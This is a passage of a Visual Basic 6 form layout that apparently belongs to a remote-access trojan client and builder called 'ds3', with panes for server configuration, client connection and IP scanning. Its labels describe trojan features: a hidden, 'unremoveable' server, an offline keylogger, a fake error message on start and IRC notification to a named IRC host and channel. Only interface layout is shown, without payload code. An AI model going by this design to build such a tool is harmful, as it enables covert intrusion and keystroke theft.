         BorderStyle     =   0  'Transparent
         Height          =   315
         Index           =   1
         Left            =   5880
         Shape           =   2  'Oval
         Top             =   2640
         Width           =   1095
      End
      Begin VB.Shape shpDialog 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   315
         Index           =   2
         Left            =   4440
         Shape           =   2  'Oval
         Top             =   2640
         Width           =   1095
      End
      Begin VB.Shape Shape3 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         FillColor       =   &H00C0C000&
         Height          =   1215
         Left            =   3000
         Shape           =   4  'Rounded Rectangle
         Top             =   1800
         Width           =   4050
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   1
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   49
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   285
         Index           =   7
         Left            =   120
         TabIndex        =   51
         Top             =   810
         Width           =   5295
      End
      Begin VB.PictureBox Picture4 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BorderStyle     =   0  'None
         ForeColor       =   &H80000008&
         Height          =   2100
         Left            =   120
         ScaleHeight     =   2100
         ScaleWidth      =   6615
         TabIndex        =   406
         Top             =   1440
         Visible         =   0   'False
         Width           =   6615
         Begin MSWinsockLib.Winsock ipscanner 
            Index           =   0
            Left            =   1560
            Top             =   480
            _ExtentX        =   741
            _ExtentY        =   741
            _Version        =   393216
         End
         Begin MSWinsockLib.Winsock wskserver 
            Left            =   120
            Top             =   1200
            _ExtentX        =   741
            _ExtentY        =   741
            _Version        =   393216
         End
         Begin VB.Frame Frame2 
            BackColor       =   &H00808000&
            BorderStyle     =   0  'None
            Height          =   255
            Left            =   0
            TabIndex        =   416
            Top             =   1320
            Width           =   1695
            Begin VB.OptionButton Option13 
               BackColor       =   &H00808000&
               Caption         =   "ON"
               ForeColor       =   &H00000000&
               Height          =   210
               Left            =   0
               TabIndex        =   418
               Top             =   0
               Width           =   615
            End
            Begin VB.OptionButton Option12 
               BackColor       =   &H00808000&
               Caption         =   "OFF"
               ForeColor       =   &H00000000&
               Height          =   210
               Left            =   960
               TabIndex        =   417
               Top             =   0
               Width           =   735
            End
         End
         Begin VB.OptionButton Option11 
            BackColor       =   &H00808000&
            Caption         =   "OFF"
            ForeColor       =   &H00000000&
            Height          =   210
            Left            =   960
            TabIndex        =   412
            Top             =   480
            Width           =   735
         End
         Begin VB.OptionButton Option9 
            BackColor       =   &H00808000&
            Caption         =   "ON"
            ForeColor       =   &H00000000&
            Height          =   210
            Left            =   0
            TabIndex        =   411
            Top             =   480
            Width           =   615
         End
         Begin VB.TextBox txttextfelder 
            Alignment       =   1  'Right Justify
            Appearance      =   0  'Flat
            BackColor       =   &H00808000&
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFC0&
            Height          =   285
            Index           =   36
            Left            =   0
            TabIndex        =   408
            Text            =   "2001"
            Top             =   0
            Width           =   1935
         End
         Begin VB.CommandButton Command3 
            BackColor       =   &H00808000&
            Caption         =   "back"
            Height          =   330
            Left            =   5400
            TabIndex        =   407
            Top             =   1680
            Width           =   1215
         End
         Begin VB.Label lblStandart 
            AutoSize        =   -1  'True
            BackColor       =   &H00000000&
            BackStyle       =   0  'Transparent
            Caption         =   """Unremoveable"" Server!"
            ForeColor       =   &H00C0C000&
            Height          =   210
            Index           =   36
            Left            =   2040
            TabIndex        =   415
            Top             =   1320
            Width           =   4515
            WordWrap        =   -1  'True
         End
         Begin VB.Label lblStandart 
            AutoSize        =   -1  'True
            BackColor       =   &H00000000&
            BackStyle       =   0  'Transparent
            Caption         =   "pagan.subgenius.net 6667 #derspaeher"
            ForeColor       =   &H00404000&
            Height          =   420
            Index           =   35
            Left            =   2040
            TabIndex        =   414
            Top             =   720
            Width           =   3450
            WordWrap        =   -1  'True
         End
         Begin VB.Label lblStandart 
            AutoSize        =   -1  'True
            BackColor       =   &H00000000&
            BackStyle       =   0  'Transparent
            Caption         =   "IRC-Notify"
            ForeColor       =   &H00C0C000&
            Height          =   210
            Index           =   34
            Left            =   2040
            TabIndex        =   413
            Top             =   480
            Width           =   1050
         End
         Begin VB.Label lblStandart 
            AutoSize        =   -1  'True
            BackColor       =   &H00000000&
            BackStyle       =   0  'Transparent
            Caption         =   "Server Port"
            ForeColor       =   &H00C0C000&
            Height          =   210
            Index           =   33
            Left            =   2040
            TabIndex        =   409
            Top             =   0
            Width           =   1155
         End
      End
      Begin VB.PictureBox Picture2 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BorderStyle     =   0  'None
         ForeColor       =   &H80000008&
         Height          =   2100
         Left            =   120
         ScaleHeight     =   2100
         ScaleWidth      =   6615
         TabIndex        =   241
         Top             =   1440
         Visible         =   0   'False
         Width           =   6615
         Begin VB.CommandButton Command4 
            BackColor       =   &H00808000&
            Caption         =   "back"
            Height          =   330
            Left            =   4080
            TabIndex        =   410
            Top             =   1680
            Width           =   1215
         End
         Begin VB.CheckBox Check2 
            BackColor       =   &H00808000&
            Caption         =   "read only"
            ForeColor       =   &H00FFFFFF&
            Height          =   210
            Left            =   120
            TabIndex        =   320
            Top             =   240
            Width           =   1695
         End
         Begin VB.CheckBox Check1 
            BackColor       =   &H00808000&
            Caption         =   "hidden"
            ForeColor       =   &H00FFFFFF&
            Height          =   210
            Left            =   120
            TabIndex        =   319
            Top             =   0
            Width           =   1575
         End
         Begin VB.TextBox txttextfelder 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00808000&
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFC0&
            Height          =   285
            Index           =   8
            Left            =   120
            TabIndex        =   315
            Text            =   "Explore"
            Top             =   1800
            Width           =   1935
         End
         Begin VB.TextBox txttextfelder 
            Alignment       =   1  'Right Justify
            Appearance      =   0  'Flat
            BackColor       =   &H00808000&
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFC0&
            Height          =   285
            Index           =   5
            Left            =   120
            TabIndex        =   310
            Text            =   "0"
            Top             =   480
            Width           =   1935
         End
         Begin VB.ListBox List3 
            Appearance      =   0  'Flat
            BackColor       =   &H00808000&
            BeginProperty Font 
               Name            =   "Courier New"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   510
            ItemData        =   "ds3English!.frx":329C
            Left            =   120
            List            =   "ds3English!.frx":32AF
            TabIndex        =   308
            Top             =   1200
            Width           =   1935
         End
         Begin VB.TextBox txttextfelder 
            Alignment       =   1  'Right Justify
            Appearance      =   0  'Flat
            BackColor       =   &H00808000&
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFC0&
            Height          =   285
            Index           =   26
            Left            =   120
            TabIndex        =   307
            Text            =   "RegKey.dat"
            Top             =   840
            Width           =   1935
         End
         Begin VB.CommandButton Command2 
            BackColor       =   &H00808000&
            Caption         =   "next"
            Height          =   330
            Left            =   5400
            TabIndex        =   243
            Top             =   1680
            Width           =   1215
         End
         Begin VB.OptionButton Option10 
            BackColor       =   &H00808000&
            Caption         =   ".exe"
            Height          =   210
            Left            =   480
            TabIndex        =   318
            Top             =   480
            Width           =   735
         End
         Begin VB.Label lblStandart 
            AutoSize        =   -1  'True
            BackColor       =   &H00000000&
            BackStyle       =   0  'Transparent
            Caption         =   "server attributes"
            ForeColor       =   &H00C0C000&
            Height          =   210
            Index           =   28
            Left            =   2160
            TabIndex        =   317
            Top             =   120
            Width           =   1785
         End
         Begin VB.Label lblStandart 
            AutoSize        =   -1  'True
            BackColor       =   &H00000000&
            BackStyle       =   0  'Transparent
            Caption         =   "regkey"
            ForeColor       =   &H00C0C000&
            Height          =   210
            Index           =   7
            Left            =   2160
            TabIndex        =   316
            Top             =   1800
            Width           =   630
         End
         Begin VB.Label lblStandart 
            AutoSize        =   -1  'True
            BackColor       =   &H00000000&
            BackStyle       =   0  'Transparent
            Caption         =   "set Bytes to the server"
            ForeColor       =   &H00C0C000&
            Height          =   210
            Index           =   4
            Left            =   2160
            TabIndex        =   311
            Top             =   480
            Width           =   2415
         End
         Begin VB.Label lblStandart 
            AutoSize        =   -1  'True
            BackColor       =   &H00000000&
            BackStyle       =   0  'Transparent
            Caption         =   "path for the offline keylogger"
            ForeColor       =   &H00C0C000&
            Height          =   210
            Index           =   29
            Left            =   2160
            TabIndex        =   309
            Top             =   1320
            Width           =   3150
         End
         Begin VB.Label lblStandart 
            AutoSize        =   -1  'True
            BackColor       =   &H00000000&
            BackStyle       =   0  'Transparent
            Caption         =   "filename for the offline keylogger"
            ForeColor       =   &H00C0C000&
            Height          =   210
            Index           =   27
            Left            =   2160
            TabIndex        =   306
            Top             =   840
            Width           =   3570
         End
      End
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BorderStyle     =   0  'None
         ForeColor       =   &H80000008&
         Height          =   2100
         Left            =   120
         ScaleHeight     =   2100
         ScaleWidth      =   6615
         TabIndex        =   229
         Top             =   1440
         Width           =   6615
         Begin VB.ListBox List4 
            Appearance      =   0  'Flat
            BackColor       =   &H00808000&
            BeginProperty Font 
               Name            =   "Courier New"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   510
            ItemData        =   "ds3English!.frx":32ED
            Left            =   120
            List            =   "ds3English!.frx":3300
            TabIndex        =   312
            Top             =   360
            Width           =   1935
         End
         Begin VB.CommandButton Command1 
            Caption         =   "next"
            Height          =   330
            Left            =   5400
            TabIndex        =   242
            Top             =   1680
            Width           =   1215
         End
         Begin VB.TextBox txttextfelder 
            Alignment       =   1  'Right Justify
            Appearance      =   0  'Flat
            BackColor       =   &H00808000&
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFC0&
            Height          =   285
            Index           =   4
            Left            =   120
            TabIndex        =   236
            Text            =   "dkbdll"
            Top             =   0
            Width           =   1935
         End
         Begin VB.OptionButton Option1 
            BackColor       =   &H00808000&
            Caption         =   "yes"
            Height          =   210
            Left            =   120
            TabIndex        =   235
            Top             =   1440
            Width           =   615
         End
         Begin VB.OptionButton Option2 
            BackColor       =   &H00808000&
            Caption         =   "no"
            Height          =   210
            Left            =   1080
            TabIndex        =   234
            Top             =   1440
            Width           =   735
         End
         Begin VB.TextBox txttextfelder 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00808000&
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFC0&
            Height          =   285
            Index           =   11
            Left            =   120
            TabIndex        =   233
            Top             =   1800
            Width           =   1935
         End
         Begin VB.Frame Frame1 
            BackColor       =   &H00808000&
            BorderStyle     =   0  'None
            Height          =   255
            Left            =   120
            TabIndex        =   230
            Top             =   1080
            Width           =   1695
            Begin VB.OptionButton Option3 
               BackColor       =   &H00808000&
               Caption         =   "no"
               Height          =   210
               Left            =   960
               TabIndex        =   232
               Top             =   0
               Width           =   735
            End
            Begin VB.OptionButton Option4 
               BackColor       =   &H00808000&
               Caption         =   "yes"
               Height          =   210
               Left            =   0
               TabIndex        =   231
               Top             =   0
               Width           =   615
            End
         End
         Begin VB.Label lblStandart 
            AutoSize        =   -1  'True
            BackColor       =   &H00000000&
            BackStyle       =   0  'Transparent
            Caption         =   "path for the server"
            ForeColor       =   &H00C0C000&
            Height          =   210
            Index           =   30
            Left            =   2160
            TabIndex        =   313
            Top             =   480
            Width           =   1995
         End
         Begin VB.Label lblStandart 
            AutoSize        =   -1  'True
            BackColor       =   &H00000000&
            BackStyle       =   0  'Transparent
            Caption         =   "server name"
            ForeColor       =   &H00C0C000&
            Height          =   210
            Index           =   3
            Left            =   2160
            TabIndex        =   240
            Top             =   0
            Width           =   1155
         End
         Begin VB.Label lblStandart 
            AutoSize        =   -1  'True
            BackColor       =   &H00000000&
            BackStyle       =   0  'Transparent
            Caption         =   "visible?"
            ForeColor       =   &H00C0C000&
            Height          =   210
            Index           =   5
            Left            =   2160
            TabIndex        =   239
            Top             =   1080
            Width           =   840
         End
         Begin VB.Label lblStandart 
            AutoSize        =   -1  'True
            BackColor       =   &H00000000&
            BackStyle       =   0  'Transparent
            Caption         =   "error message on start?"
            ForeColor       =   &H00C0C000&
            Height          =   210
            Index           =   6
            Left            =   2160
            TabIndex        =   238
            Top             =   1440
            Width           =   2415
         End
         Begin VB.Label lblStandart 
            AutoSize        =   -1  'True
            BackColor       =   &H00000000&
            BackStyle       =   0  'Transparent
            Caption         =   "server password"
            ForeColor       =   &H00C0C000&
            Height          =   210
            Index           =   10
            Left            =   2160
            TabIndex        =   237
            Top             =   1800
            Width           =   1575
         End
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "current settings"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   390
         Index           =   4
         Left            =   240
         TabIndex        =   55
         Top             =   3585
         Width           =   3495
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "Yeah"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   390
         Index           =   1
         Left            =   5400
         TabIndex        =   53
         Top             =   3585
         Width           =   1335
      End
      Begin VB.Label Label3 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "server:"
         ForeColor       =   &H00404000&
         Height          =   210
         Left            =   120
         TabIndex        =   52
         Top             =   480
         Width           =   735
      End
      Begin VB.Image Image2 
         Height          =   240
         Left            =   5520
         Picture         =   "ds3English!.frx":333E
         Top             =   840
         Width           =   240
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   435
         Index           =   1
         Left            =   5280
         Shape           =   2  'Oval
         Top             =   3570
         Width           =   1575
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   435
         Index           =   4
         Left            =   120
         Shape           =   2  'Oval
         Top             =   3570
         Width           =   3735
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   735
         Index           =   3
         Left            =   0
         Top             =   480
         Width           =   6915
      End
      Begin VB.Label lblServerUeberschriftTarnung 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "SERVER: CONFIGURATION"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   780
         TabIndex        =   50
         Top             =   0
         Width           =   5385
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   2715
         Index           =   2
         Left            =   0
         Top             =   1320
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   2
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   56
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   285
         Index           =   35
         Left            =   240
         TabIndex        =   404
         Text            =   "2001"
         Top             =   1200
         Width           =   2295
      End
      Begin VB.OptionButton Option8 
         BackColor       =   &H00808000&
         Caption         =   "ICQ-UIN"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Left            =   4200
         TabIndex        =   372
         Top             =   720
         Width           =   1335
      End
      Begin VB.OptionButton Option7 
         BackColor       =   &H00808000&
         Caption         =   "IP adress"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Left            =   2640
         TabIndex        =   371
         Top             =   720
         Width           =   1335
      End
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BorderStyle     =   0  'None
         Height          =   975
         Index           =   12
         Left            =   2280
         MultiLine       =   -1  'True
         TabIndex        =   62
         Text            =   "ds3English!.frx":3488
         Top             =   2880
         Width           =   4575
      End
      Begin VB.Timer tmrVerbinden 
         Enabled         =   0   'False
         Interval        =   1000
         Left            =   5880
         Top             =   1200
      End
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   285
         Index           =   10
         Left            =   240
         TabIndex        =   59
         Top             =   1680
         Width           =   2295
      End
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   285
         Index           =   9
         Left            =   240
         TabIndex        =   58
         Text            =   "127.0.0.1"
         Top             =   720
         Width           =   2295
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "Port"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   32
         Left            =   2640
         TabIndex        =   405
         Top             =   1200
         Width           =   420
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "save"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   255
         Index           =   2
         Left            =   5505
         TabIndex        =   64
         Top             =   2415
         Width           =   1245
      End
      Begin VB.Label lblHinweiszuServerEinstellungen 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Here, you can notice something, about whatever..."
         ForeColor       =   &H00C0C000&
         Height          =   975
         Index           =   3
         Left            =   360
         TabIndex        =   63
         Top             =   2880
         Width           =   1725
         WordWrap        =   -1  'True
      End
      Begin VB.Shape Shape1 
         BackColor       =   &H00C0C000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   1215
         Left            =   2160
         Shape           =   4  'Rounded Rectangle
         Top             =   2760
         Width           =   4815
      End
      Begin VB.Label lblersatz 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "connect"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   390
         Index           =   5
         Left            =   360
         TabIndex        =   61
         Top             =   2175
         Width           =   1935
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "password (optional)"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   9
         Left            =   2640
         TabIndex        =   60
         Top             =   1680
         Width           =   1995
      End
      Begin VB.Label lblClientUeberschrift 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "CLIENT: CONNECTION"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   1320
         TabIndex        =   57
         Top             =   0
         Width           =   4605
      End
      Begin VB.Shape shpersatz 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   435
         Index           =   5
         Left            =   240
         Shape           =   2  'Oval
         Top             =   2160
         Width           =   2175
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   300
         Index           =   2
         Left            =   5400
         Shape           =   2  'Oval
         Top             =   2400
         Width           =   1455
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   5
         Left            =   120
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   4
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   71
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   285
         Index           =   27
         Left            =   4800
         MaxLength       =   4
         TabIndex        =   330
         Text            =   "2000"
         Top             =   1200
         Width           =   735
      End
      Begin VB.ListBox lstIPErgebnisse 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00FFFFFF&
         Height          =   1290
         Left            =   240
         TabIndex        =   78
         Top             =   2640
         Width           =   6495
      End
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   285
         Index           =   13
         Left            =   240
         TabIndex        =   74
         Text            =   "127.0.0"
         Top             =   1200
         Width           =   2295
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "interval"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   31
         Left            =   5640
         TabIndex        =   331
         Top             =   1200
         Width           =   960
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "delete"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   315
         Index           =   8
         Left            =   4950
         TabIndex        =   80
         Top             =   1935
         Width           =   1635
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "ip-adresses:"
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   14
         Left            =   240
         TabIndex        =   79
         Top             =   2400
         Width           =   1260
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "stop"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   315
         Index           =   7
         Left            =   2700
         TabIndex        =   77
         Top             =   1935
         Width           =   1605
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "start"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   315
         Index           =   6
         Left            =   360
         TabIndex        =   76
         Top             =   1935
         Width           =   1635
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "1-255"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   13
         Left            =   2640
         TabIndex        =   75
         Top             =   1200
         Width           =   600
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "ip-adress:"
         ForeColor       =   &H00C0C000&
         Height          =   210
         Index           =   12
         Left            =   240
         TabIndex        =   73
         Top             =   960
         Width           =   1050
      End
      Begin VB.Label Label2 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "CLIENT: IP SCANNER"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   1170
         TabIndex        =   72
         Top             =   0
         Width           =   4605
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   360
         Index           =   6
         Left            =   240
         Shape           =   2  'Oval
         Top             =   1920
         Width           =   1935
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   360
         Index           =   7
         Left            =   2520
         Shape           =   2  'Oval
         Top             =   1920
         Width           =   1935
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   360
         Index           =   8
         Left            =   4800
         Shape           =   2  'Oval
         Top             =   1920
         Width           =   1935
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   6
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   3
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   65
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
